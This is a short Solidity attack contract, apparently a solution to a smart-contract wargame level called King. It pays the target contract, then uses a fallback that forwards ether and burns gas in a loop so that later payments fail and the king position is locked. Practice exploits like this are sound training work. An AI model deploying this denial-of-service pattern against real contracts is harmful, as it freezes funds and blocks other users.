pragma solidity ^0.4.24;

import "zeppelin/contracts/ownership/Ownable.sol";
import "levels/King.sol";

contract KingHack {
    address public level;
    address public mywallet;
    King    public target;

    event log(uint256 indexed val);
    
    constructor(address _inst) public {
        target = King(_inst);
    }
    
    function attack() public {
        target.transfer(1);
        mywallet = msg.sender;
    }

    function () public payable {
        mywallet.transfer(msg.value);
        
        // waste gasleft
        for(uint i = 0; i < 1000; i++)
            emit log(i);
    }
}